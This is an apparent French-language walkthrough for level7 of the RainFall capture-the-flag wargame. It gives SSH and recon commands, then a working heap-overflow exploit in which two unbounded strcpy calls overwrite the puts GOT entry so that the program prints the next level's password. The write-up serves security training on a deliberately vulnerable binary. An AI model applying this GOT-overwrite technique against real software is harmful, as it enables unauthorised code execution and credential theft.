# Level7 — Commandes

## Connexion

```bash
ssh level7@localhost -p 4242
```

Mot de passe : (dans `level6/flag`)

---

## Recon

```bash
pwd
ls -la
file level7
readelf -h level7
```

Extraction (depuis l’hôte, dans `level7/`) :  
`sshpass -p '<level7_password>' scp -o StrictHostKeyChecking=no -P 4242 level7@localhost:level7 ./level7.bin`

Voir `analysis.md`.

---

## Exploitation

Deux **strcpy** sans limite : le premier remplit un bloc 8 octets (argv[1]) ; en dépassant, on écrase le pointeur utilisé comme **destination** du second strcpy. On peut donc écrire argv[2] à une adresse choisie. Le programme lit ensuite le mot de passe dans le buffer global **c** (0x8049960) puis appelle **puts(0x8048703)** (affiche "~~"). En réécrivant l’argument de puts (l’immédiat à 0x80485f4) avec l’adresse de **c**, puts affiche le mot de passe.

### Commande (GOT de puts → m)

Modifier l’**argument** de puts (0x80485f4) fait écrire un `\0` à 0x80485f8 et casse l’instruction **call** → segfault. Mieux : remplacer l’entrée **GOT de puts** (0x8049928) par l’adresse de **m** (0x80484f4). **m()** fait `printf("%s - %d\n", c, time)` donc affiche le buffer **c** (où le mot de passe a été lu). Un seul write ; le `\0` de strcpy tombe dans la GOT suivante (souvent inutilisée).

Sur RainFall l’offset vers ptr2[1] est **20** octets.

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

- argv[1] : 20 octets + adresse **GOT puts** 0x8049928 (destination du 2ᵉ strcpy).
- argv[2] : adresse de **m** 0x80484f4 à écrire dans la GOT.

### Récupération du mot de passe level8

En cas de succès, **m()** affiche une ligne `(mot de passe) - (timestamp)` ; le mot de passe level8 est la première partie. Noter dans `level7/flag`. Validé sur RainFall (offset 20, GOT puts → m).
